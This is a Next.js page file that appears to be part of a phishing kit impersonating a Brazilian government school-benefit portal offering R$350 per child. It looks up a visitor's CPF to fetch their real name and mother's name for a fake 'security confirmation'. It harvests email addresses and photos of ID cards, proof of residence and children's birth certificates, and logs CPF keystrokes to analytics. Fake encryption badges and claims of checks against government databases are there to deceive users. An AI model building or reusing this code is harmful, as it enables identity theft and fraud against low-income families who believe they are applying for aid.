"use client";

import { GovHeader } from "@/components/GovHeader";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { ArrowRight, Check, Loader2, User, FileText, School, Upload, X, ShieldCheck, AlertCircle, Lock, Mail, Info } from "lucide-react";
import { CameraModal } from "@/components/CameraModal";
import { getSessionId } from "@/lib/session";

// Types for API Response
interface UserData {
    cpf: string;
    nome: string;
    sexo: string;
    nascimento: string;
    nome_mae: string;
}

// Utility to generate fake names
const generateFakeNames = (correctName: string, type: 'name' | 'mother') => {
    const firstNames = ["Maria", "Ana", "Francisca", "Antônia", "Adriana", "Juliana", "Márcia", "Fernanda", "Patrícia", "Aline"];
    const middleNames = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Lima", "Gomes"];
    const lastNames = ["Costa", "Ribeiro", "Martins", "Carvalho", "Almeida", "Lopes", "Soares", "Fernandes", "Vieira", "Barbosa"];

    const fakes: string[] = [];
    while (fakes.length < 2) {
        const fake = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${middleNames[Math.floor(Math.random() * middleNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
        if (fake !== correctName && !fakes.includes(fake)) {
            fakes.push(fake);
        }
    }
    return [correctName, ...fakes].sort(() => Math.random() - 0.5);
};

// Utility to generate fake years
const generateFakeYears = (correctYear: number) => {
    const fakes: number[] = [];
    while (fakes.length < 2) {
        const offset = Math.floor(Math.random() * 5) + 1; // 1 to 5 years difference
        const sign = Math.random() > 0.5 ? 1 : -1;
        const fake = correctYear + (offset * sign);
        if (fake !== correctYear && !fakes.includes(fake)) {
            fakes.push(fake);
        }
    }
    return [correctYear, ...fakes].sort(() => Math.random() - 0.5);
};

// Utility to generate fake ages
const generateFakeAges = (correctAge: number) => {
    const fakes: number[] = [];
    while (fakes.length < 2) {
        const offset = Math.floor(Math.random() * 4) + 1; // 1 to 4 years difference
        const sign = Math.random() > 0.5 ? 1 : -1;
        const fake = correctAge + (offset * sign);
        if (fake !== correctAge && !fakes.includes(fake)) {
            fakes.push(fake);
        }
    }
    return [correctAge, ...fakes].sort(() => Math.random() - 0.5);
};


export default function SolicitarPage() {
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false);
    const [numFilhos, setNumFilhos] = useState(1);
    const [uploadedDocs, setUploadedDocs] = useState<{ [key: string]: { name: string, status: 'uploaded' | 'pending' } }>({});

    // Camera State
    const [isCameraOpen, setIsCameraOpen] = useState(false);
    const [activeDocType, setActiveDocType] = useState<string | null>(null);
    const [activeDocLabel, setActiveDocLabel] = useState<string>("");

    // Quiz State
    const [cpfInput, setCpfInput] = useState("");
    const [emailInput, setEmailInput] = useState("");
    const [userData, setUserData] = useState<UserData | null>(null);
    const [quizStep, setQuizStep] = useState(0); // 0: CPF, 1: Name, 2: Mother/Age, 3: Birth Year
    const [quizOptions, setQuizOptions] = useState<(string | number)[]>([]);
    const [quizError, setQuizError] = useState("");
    const [selectedOption, setSelectedOption] = useState<string | number | null>(null);

    // Track Step Changes (Major Wizard Steps)
    useEffect(() => {
        let stepName = 'solicitando_dados_pessoais';
        if (step === 2) stepName = 'escolhendo_qtd_filhos';
        if (step === 3) stepName = 'enviando_documentos';
        if (step === 4) stepName = 'analisando';

        fetch('/api/analytics', {
            method: 'POST',
            body: JSON.stringify({
                step: stepName,
                sessionId: getSessionId()
            })
        }).catch(e => console.error(e));
    }, [step]);

    // Track CPF Typing (Granular)
    useEffect(() => {
        if (cpfInput.length > 2) {
            const timer = setTimeout(() => {
                fetch('/api/analytics', {
                    method: 'POST',
                    body: JSON.stringify({
                        step: 'solicitando_dados_pessoais',
                        metadata: { cpf: cpfInput, action: 'digitando_cpf' },
                        sessionId: getSessionId()
                    })
                }).catch(e => console.error(e));
            }, 1000);
            return () => clearTimeout(timer);
        }
    }, [cpfInput]);

    // Track Quiz Progression (Granular)
    useEffect(() => {
        if (quizStep > 0) {
            fetch('/api/analytics', {
                method: 'POST',
                body: JSON.stringify({
                    step: 'perguntas_de_seguranca',
                    metadata: { action: `respondendo_pergunta_${quizStep}`, quiz_step: quizStep },
                    sessionId: getSessionId()
                })
            }).catch(e => console.error(e));
        }
    }, [quizStep]);

    const handleFileUpload = (docType: string, fileName: string) => {
        if (!fileName) {
            const newDocs = { ...uploadedDocs };
            delete newDocs[docType];
            setUploadedDocs(newDocs);
            return;
        }
        setUploadedDocs(prev => ({ ...prev, [docType]: { name: fileName, status: 'uploaded' } }));
    };

    const startCamera = (docType: string, label: string) => {
        setActiveDocType(docType);
        setActiveDocLabel(label);
        setIsCameraOpen(true);
        // Track step: taking_photo is now a substep of documents
        fetch('/api/analytics', {
            method: 'POST',
            body: JSON.stringify({
                step: 'enviando_documentos',
                metadata: { action: 'abriu_camera', doc: docType },
                sessionId: getSessionId()
            })
        }).catch(e => console.error(e));
    };

    const handlePhotoCapture = async (file: File) => {
        if (!activeDocType) return;

        // Optimistic UI update
        handleFileUpload(activeDocType, file.name);

        // Upload to backend
        const formData = new FormData();
        formData.append('file', file);
        formData.append('type', activeDocType);
        formData.append('cpf', cpfInput);

        try {
            await fetch('/api/upload', {
                method: 'POST',
                body: formData,
            });
            console.log("Upload succesful for", activeDocType);
        } catch (error) {
            console.error("Upload failed", error);
        }
    };

    const fetchUserData = async () => {
        if (cpfInput.length < 11) return;
        setLoading(true);
        setQuizError("");

        try {
            const res = await fetch(`/api/validate-cpf?cpf=${cpfInput}`);
            const data = await res.json();

            if (data.success && data.data) {
                setUserData(data.data);
                prepareNameQuiz(data.data.nome);
            } else {
                setQuizError("CPF não encontrado. Verifique se digitou corretamente.");
            }
        } catch (error) {
            setQuizError("Erro de comunicação. Tente novamente.");
        } finally {
            setLoading(false);
        }
    };

    const prepareNameQuiz = (correctName: string) => {
        setQuizOptions(generateFakeNames(correctName, 'name'));
        setQuizStep(1);
    };

    const prepareMotherQuiz = () => {
        if (userData?.nome_mae) {
            setQuizOptions(generateFakeNames(userData.nome_mae, 'mother'));
            setQuizStep(2);
        } else {
            // Fallback to Age if mother's name is missing
            const birthYear = parseInt(userData!.nascimento.split('/')[2]);
            const currentYear = new Date().getFullYear();
            const age = currentYear - birthYear;
            setQuizOptions(generateFakeAges(age));
            setQuizStep(2); // Using step 2 for age as well logic-wise
        }
    };

    const prepareBirthQuiz = () => {
        const birthYear = parseInt(userData!.nascimento.split('/')[2]);
        setQuizOptions(generateFakeYears(birthYear));
        setQuizStep(3);
    };

    const handleQuizAnswer = (answer: string | number) => {
        setSelectedOption(answer);
        setLoading(true);
        setQuizError("");

        // Simulate "Validating" delay
        setTimeout(() => {
            let isCorrect = false;

            if (quizStep === 1) { // Name Check
                isCorrect = answer === userData?.nome;
                if (isCorrect) {
                    prepareMotherQuiz();
                    // Create initial record in DB
                    saveToDB({
                        cpf: cpfInput,
                        email: emailInput,
                        nome: userData?.nome || "Nome não identificado",
                        nascimento: userData?.nascimento,
                        nome_mae: userData?.nome_mae,
                        status: 'pendente'
                    });
                }
            } else if (quizStep === 2) { // Mother or Age Check
                if (userData?.nome_mae) {
                    isCorrect = answer === userData.nome_mae;
                } else {
                    const birthYear = parseInt(userData!.nascimento.split('/')[2]);
                    const currentYear = new Date().getFullYear();
                    const age = currentYear - birthYear;
                    isCorrect = answer === age;
                }

                if (isCorrect) {
                    prepareBirthQuiz();
                }
            } else if (quizStep === 3) { // Birth Year Check
                const birthYear = parseInt(userData!.nascimento.split('/')[2]);
                isCorrect = answer === birthYear;
                if (isCorrect) {
                    setStep(2); // Success! Move to dependent step
                }
            }

            if (!isCorrect) {
                setQuizError("Resposta incorreta. Por motivos de segurança, verifique seus dados.");
                setSelectedOption(null); // Reset selection on error
            }
            // Don't reset on success - keep it selected

            setLoading(false);
        }, 800);
    };

    const router = useRouter();

    const saveToDB = async (data: any) => {
        try {
            await fetch('/api/solicitations', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (e) {
            console.error("Failed to save to DB", e);
        }
    };

    const handleNext = () => {
        setLoading(true);

        // Save current progress
        const currentData = {
            cpf: cpfInput,
            num_filhos: numFilhos,
            valor: (numFilhos * 350).toFixed(2)
        };
        saveToDB(currentData);

        setTimeout(() => {
            setLoading(false);
            if (step < 4) setStep(step + 1);
            else {
                // Final submission
                saveToDB({ cpf: cpfInput, status: 'analise' });

                // Track step: form_submitted
                fetch('/api/analytics', {
                    method: 'POST',
                    body: JSON.stringify({
                        step: 'form_submitted',
                        metadata: { cpf: cpfInput },
                        sessionId: getSessionId()
                    })
                }).catch(e => console.error(e));

                const params = new URLSearchParams();
                if (userData?.nome) params.set('nome', userData.nome);
                if (emailInput) params.set('email', emailInput);
                params.set('cpf', cpfInput);
                const limitValue = (numFilhos * 350).toFixed(2);
                params.set('limit', limitValue);
                router.push(`/analise?${params.toString()}`);
            }
        }, 1500);
    };

    // Helper functions for masking
    const maskCPF = (v: string) => {
        v = v.replace(/\D/g, "");
        if (v.length > 11) v = v.slice(0, 11);

        return v
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    };

    return (
        <div className="min-h-screen bg-slate-50 flex flex-col">
            <GovHeader />

            <CameraModal
                isOpen={isCameraOpen}
                onClose={() => setIsCameraOpen(false)}
                onCapture={handlePhotoCapture}
                label={activeDocLabel}
            />

            <main className="flex-1 container-centered py-12">
                <div className="max-w-2xl mx-auto">
                    {/* Progress Bar */}
                    <div className="mb-8">
                        <div className="flex justify-between mb-2">
                            <span className={`text-sm font-bold ${step >= 1 ? 'text-gov-blue-800' : 'text-gray-400'}`}>Dados Pessoais</span>
                            <span className={`text-sm font-bold ${step >= 2 ? 'text-gov-blue-800' : 'text-gray-400'}`}>Dependentes</span>
                            <span className={`text-sm font-bold ${step >= 3 ? 'text-gov-blue-800' : 'text-gray-400'}`}>Documentos</span>
                            <span className={`text-sm font-bold ${step >= 4 ? 'text-gov-blue-800' : 'text-gray-400'}`}>Análise</span>
                        </div>
                        <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
                            <div
                                className="h-full bg-gov-green-600 transition-all duration-500 ease-out"
                                style={{ width: `${(step / 4) * 100}%` }}
                            ></div>
                        </div>
                    </div>

                    <div className="bg-white rounded-2xl shadow-lg border border-slate-100 overflow-hidden">
                        <div className="p-8">
                            {/* STEP 1: IDENTITY VALIDATION QUIZ */}
                            {step === 1 && (
                                <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
                                    <div className="flex items-center gap-3 mb-6">
                                        <div className="bg-blue-100 p-3 rounded-full text-gov-blue-800">
                                            <ShieldCheck className="h-6 w-6" />
                                        </div>
                                        <div>
                                            <h2 className="text-2xl font-bold text-slate-900">
                                                {quizStep === 0 ? "Consulta de Elegibilidade" : "Confirmação de Segurança"}
                                            </h2>
                                            {quizStep === 0 && <p className="text-sm text-slate-500">Informe seu CPF para verificar a disponibilidade do benefício</p>}
                                        </div>
                                    </div>

                                    {quizError && (
                                        <div className="bg-red-50 border border-red-200 p-4 rounded-lg flex items-start gap-3 text-red-700">
                                            <AlertCircle className="h-5 w-5 flex-shrink-0 mt-0.5" />
                                            <p className="text-sm font-medium">{quizError}</p>
                                        </div>
                                    )}

                                    {/* QUIZ STEP 0: CPF Input */}
                                    {quizStep === 0 && (
                                        <div className="space-y-6">
                                            <div className="bg-slate-50 p-6 rounded-xl border border-slate-200 space-y-4">
                                                <div>
                                                    <label className="block text-sm font-bold text-slate-700 mb-2">CPF do Responsável</label>
                                                    <div className="relative">
                                                        <input
                                                            type="text"
                                                            placeholder="000.000.000-00"
                                                            className="w-full p-4 pl-12 border border-slate-300 rounded-lg focus:ring-2 focus:ring-gov-blue-700 outline-none text-xl tracking-widest font-mono text-slate-900"
                                                            value={maskCPF(cpfInput)}
                                                            onChange={(e) => setCpfInput(e.target.value.replace(/\D/g, ""))}
                                                            maxLength={14}
                                                        />
                                                        <User className="absolute left-4 top-1/2 transform -translate-y-1/2 text-slate-400 h-6 w-6" />
                                                    </div>
                                                </div>

                                                <div>
                                                    <label className="block text-sm font-bold text-slate-700 mb-2">E-mail para Contato</label>
                                                    <div className="relative">
                                                        <input
                                                            type="email"
                                                            placeholder="seu@email.com"
                                                            className="w-full p-4 pl-12 border border-slate-300 rounded-lg focus:ring-2 focus:ring-gov-blue-700 outline-none text-lg text-slate-900"
                                                            value={emailInput}
                                                            onChange={(e) => setEmailInput(e.target.value)}
                                                        />
                                                        <Mail className="absolute left-4 top-1/2 transform -translate-y-1/2 text-slate-400 h-6 w-6" />
                                                    </div>
                                                </div>
                                            </div>

                                            <div className="flex items-center gap-2 mt-3 text-xs text-slate-500 justify-center">
                                                <div className="flex items-center gap-1 text-green-700 bg-green-50 px-2 py-1 rounded">
                                                    <Lock className="h-3 w-3" />
                                                    <span className="font-semibold">AES-256</span>
                                                </div>
                                                <div className="flex items-center gap-1 text-slate-600 bg-slate-100 px-2 py-1 rounded">
                                                    <ShieldCheck className="h-3 w-3" />
                                                    <span>Ambiente Seguro</span>
                                                </div>
                                            </div>

                                            <button
                                                onClick={fetchUserData}
                                                disabled={loading || cpfInput.length < 11 || !emailInput.includes('@')}
                                                className="w-full bg-gov-green-600 text-white px-6 py-4 rounded-lg font-bold text-lg hover:bg-gov-green-700 transition-all disabled:opacity-70 disabled:cursor-not-allowed flex justify-center items-center gap-2 shadow-md hover:shadow-lg transform active:scale-95"
                                            >
                                                {loading ? <Loader2 className="animate-spin" /> : "CONSULTAR"}
                                            </button>

                                            <div className="text-center">
                                                <p className="text-xs text-slate-400">
                                                    Seus dados são utilizados apenas para consulta de elegibilidade conforme a LGPD.
                                                </p>
                                            </div>
                                        </div>
                                    )}

                                    {/* QUIZ STEPS 1, 2, 3: Questions */}
                                    {quizStep > 0 && (
                                        <div className="space-y-6">
                                            <div className="bg-blue-50 border-l-4 border-gov-blue-600 p-4 rounded-r-lg mb-6">
                                                <p className="text-lg text-gov-blue-900 font-medium">
                                                    {quizStep === 1 && "Para sua segurança, confirme o NOME COMPLETO:"}
                                                    {quizStep === 2 && (userData?.nome_mae ? "Confirme o nome da sua MÃE:" : "Confirme sua IDADE aproximada:")}
                                                    {quizStep === 3 && "Por fim, confirme seu ANO DE NASCIMENTO:"}
                                                </p>
                                            </div>

                                            <div className="grid gap-3">
                                                {quizOptions.map((option, idx) => {
                                                    const isSelected = selectedOption === option;
                                                    return (
                                                        <button
                                                            key={idx}
                                                            onClick={() => handleQuizAnswer(option)}
                                                            disabled={loading}
                                                            className={`w-full text-left p-4 rounded-xl border-2 transition-all font-medium flex justify-between items-center group relative
                                                                ${isSelected
                                                                    ? 'border-gov-blue-600 bg-gov-blue-50 text-gov-blue-900 shadow-md ring-2 ring-gov-blue-200 z-10'
                                                                    : 'border-slate-300 bg-white hover:border-gov-blue-400 hover:bg-slate-50 text-slate-700'
                                                                }
                                                            `}
                                                        >
                                                            <span className="text-lg">{option}</span>
                                                            <div className={`h-7 w-7 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 bg-white
                                                                ${isSelected
                                                                    ? 'border-gov-blue-600'
                                                                    : 'border-slate-400 group-hover:border-gov-blue-500'
                                                                }
                                                            `}>
                                                                <div className={`h-3.5 w-3.5 bg-blue-600 rounded-full transition-transform duration-200 ${isSelected ? 'scale-100' : 'scale-0'}`}></div>
                                                            </div>
                                                        </button>
                                                    );
                                                })}
                                            </div>

                                            {loading && (
                                                <div className="flex justify-center items-center gap-2 py-4 text-gov-blue-700 font-medium animate-pulse bg-gov-blue-50 rounded-lg">
                                                    <Loader2 className="animate-spin h-5 w-5" />
                                                    Validando informações de segurança...
                                                </div>
                                            )}
                                        </div>
                                    )}
                                </div>
                            )}

                            {step === 2 && (
                                <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
                                    <div className="flex items-center gap-3 mb-6">
                                        <div className="bg-blue-100 p-3 rounded-full text-gov-blue-800">
                                            <School className="h-6 w-6" />
                                        </div>
                                        <h2 className="text-2xl font-bold text-slate-900">Quantos filhos na escola?</h2>
                                    </div>

                                    <div className="space-y-4">
                                        <p className="text-slate-600">Informe o número de dependentes matriculados na rede pública em 2026.</p>
                                        <select
                                            className="w-full p-4 border border-slate-200 rounded-lg text-lg focus:ring-2 focus:ring-gov-blue-700 outline-none"
                                            value={numFilhos}
                                            onChange={(e) => setNumFilhos(Number(e.target.value))}
                                        >
                                            <option value={1}>1 Filho</option>
                                            <option value={2}>2 Filhos</option>
                                            <option value={3}>3 Filhos</option>
                                            <option value={4}>4 ou mais</option>
                                        </select>
                                        <div className="bg-green-50 border border-green-200 p-4 rounded-lg">
                                            <p className="text-sm text-green-800 font-medium">
                                                <strong>Valor calculado:</strong> <span className="text-xl font-bold">R$ {(numFilhos * 350).toFixed(2)}</span>
                                                <br />
                                                <span className="text-xs opacity-75">({numFilhos} {numFilhos === 1 ? 'filho' : 'filhos'} × R$ 350,00)</span>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {step === 3 && (
                                <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
                                    <div className="flex items-center gap-3 mb-6">
                                        <div className="bg-blue-100 p-3 rounded-full text-gov-blue-800">
                                            <FileText className="h-6 w-6" />
                                        </div>
                                        <div className="flex-1">
                                            <h2 className="text-2xl font-bold text-slate-900">Documentação</h2>
                                            <p className="text-sm text-slate-500">Envie foto ou arquivo dos documentos.</p>
                                        </div>
                                    </div>

                                    <div className="space-y-4">
                                        <DocumentUpload
                                            label="RG ou CNH do Responsável"
                                            docType="rg"
                                            uploaded={uploadedDocs['rg']?.name}
                                            onUpload={handleFileUpload}
                                            onOpenCamera={() => startCamera('rg', 'RG ou CNH do Responsável')}
                                        />

                                        <DocumentUpload
                                            label="Comprovante de Residência"
                                            docType="comprovante"
                                            uploaded={uploadedDocs['comprovante']?.name}
                                            onUpload={handleFileUpload}
                                            onOpenCamera={() => startCamera('comprovante', 'Comprovante de Residência')}
                                        />

                                        {Array.from({ length: numFilhos }).map((_, i) => (
                                            <DocumentUpload
                                                key={i}
                                                label={`Certidão / RG - Filho ${i + 1}`}
                                                docType={`certidao_${i}`}
                                                uploaded={uploadedDocs[`certidao_${i}`]?.name}
                                                onUpload={handleFileUpload}
                                                onOpenCamera={() => startCamera(`certidao_${i}`, `Certidão / RG - Filho ${i + 1}`)}
                                            />
                                        ))}
                                    </div>

                                    <div className="bg-blue-50 border border-blue-100 p-4 rounded-xl flex gap-3 items-start">
                                        <Info className="h-5 w-5 text-gov-blue-600 flex-shrink-0 mt-0.5" />
                                        <p className="text-xs text-blue-800">
                                            <strong>Dica:</strong> Procure um local iluminado para tirar as fotos. Certifique-se que os dados estejam legíveis.
                                        </p>
                                    </div>
                                </div>
                            )}

                            {step === 4 && (
                                <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500 text-center py-8">
                                    <div className="mb-6 flex justify-center">
                                        <div className="h-20 w-20 bg-blue-50 rounded-full flex items-center justify-center">
                                            <FileText className="h-10 w-10 text-gov-blue-800" />
                                        </div>
                                    </div>
                                    <h2 className="text-2xl font-bold text-slate-900">Confirmar Solicitação</h2>
                                    <p className="text-slate-600 max-w-md mx-auto">
                                        Ao clicar em finalizar, seus dados serão cruzados com as bases do <strong>CadÚnico, MEC e INEP</strong> para aprovação em até 48 horas.
                                    </p>
                                    <div className="bg-slate-50 p-4 rounded-lg max-w-sm mx-auto text-left">
                                        <p className="text-xs text-slate-500 mb-2 font-semibold uppercase">Resumo da Solicitação</p>
                                        <div className="space-y-1 text-sm text-slate-700">
                                            <p className="capitalize"><strong>Nome:</strong> {userData?.nome.toLowerCase()}</p>
                                            <p>• {numFilhos} {numFilhos === 1 ? 'dependente' : 'dependentes'}</p>
                                            <p>• {Object.keys(uploadedDocs).length} documentos enviados</p>
                                            <p className="font-bold text-gov-green-700">• Valor: R$ {(numFilhos * 350).toFixed(2)}</p>
                                        </div>
                                    </div>
                                </div>
                            )}

                            <div className="mt-8 pt-6 border-t border-slate-100 flex justify-between items-center gap-4">
                                {step > 1 && (
                                    <button
                                        onClick={() => setStep(step - 1)}
                                        className="flex items-center gap-2 text-slate-600 px-4 py-3 rounded-lg font-semibold hover:bg-slate-50 transition-colors"
                                    >
                                        Voltar
                                    </button>
                                )}
                                {step > 1 && (
                                    <button
                                        onClick={() => {
                                            // Validation for Step 3 (Documents)
                                            if (step === 3) {
                                                const requiredDocs = ['rg', 'comprovante'];
                                                for (let i = 0; i < numFilhos; i++) requiredDocs.push(`certidao_${i}`);

                                                const missing = requiredDocs.filter(doc => !uploadedDocs[doc]);

                                                if (missing.length > 0) {
                                                    alert("Por favor, envie todos os documentos obrigatórios para continuar.");
                                                    return;
                                                }
                                            }
                                            handleNext();
                                        }}
                                        disabled={loading}
                                        className="flex-1 flex items-center justify-center gap-2 bg-gov-green-600 text-white px-6 py-4 rounded-lg font-bold hover:bg-gov-green-700 transition-all disabled:opacity-70 disabled:cursor-not-allowed shadow-md text-lg"
                                    >
                                        {loading ? (
                                            <>
                                                <Loader2 className="h-5 w-5 animate-spin" />
                                                Processando...
                                            </>
                                        ) : (
                                            <>
                                                {step === 4 ? 'Finalizar Solicitação' : 'Continuar'}
                                                <ArrowRight className="h-5 w-5" />
                                            </>
                                        )}
                                    </button>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}

import { Camera } from "lucide-react";

function DocumentUpload({ label, docType, uploaded, onUpload, onOpenCamera }: {
    label: string,
    docType: string,
    uploaded?: string,
    onUpload: (docType: string, fileName: string) => void,
    onOpenCamera: () => void
}) {
    const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0];
        if (file) {
            onUpload(docType, file.name);
        }
    };

    return (
        <div className={`border-2 border-dashed rounded-xl p-4 transition-all ${uploaded ? 'border-green-400 bg-green-50/50' : 'border-slate-300 hover:border-gov-blue-400'}`}>
            <div className="flex justify-between items-start mb-3">
                <label className="text-sm font-bold text-slate-700 flex-1 mr-2">{label}</label>
                {uploaded && <CheckCircle2 className="h-5 w-5 text-green-600 flex-shrink-0" />}
            </div>

            {uploaded ? (
                <div className="flex items-center justify-between bg-white p-3 rounded-lg border border-green-200 shadow-sm">
                    <div className="flex items-center gap-2 text-slate-700 overflow-hidden">
                        <FileText className="h-4 w-4 text-slate-400 flex-shrink-0" />
                        <span className="text-sm font-medium truncate">{uploaded}</span>
                    </div>
                    <button
                        onClick={() => onUpload(docType, '')}
                        className="text-red-500 hover:text-red-700 p-1 rounded-full hover:bg-red-50 transition-colors"
                    >
                        <X className="h-4 w-4" />
                    </button>
                </div>
            ) : (
                <div className="grid grid-cols-2 gap-3">
                    {/* Camera Button */}
                    <button
                        onClick={onOpenCamera}
                        className="flex flex-col items-center justify-center cursor-pointer bg-gov-blue-50 hover:bg-gov-blue-100 text-gov-blue-700 py-3 rounded-lg border border-gov-blue-200 transition-all active:scale-95 group"
                    >
                        <Camera className="h-6 w-6 mb-1 group-hover:scale-110 transition-transform" />
                        <span className="text-xs font-bold">Tirar Foto</span>
                    </button>

                    {/* File Upload Button */}
                    <label className="flex flex-col items-center justify-center cursor-pointer bg-slate-50 hover:bg-slate-100 text-slate-600 py-3 rounded-lg border border-slate-200 transition-all active:scale-95">
                        <Upload className="h-6 w-6 mb-1" />
                        <span className="text-xs font-bold">Enviar Arquivo</span>
                        <input
                            type="file"
                            className="hidden"
                            accept=".pdf,.jpg,.jpeg,.png"
                            onChange={handleFileChange}
                        />
                    </label>
                </div>
            )}
        </div>
    );
}

import { CheckCircle2 } from "lucide-react";
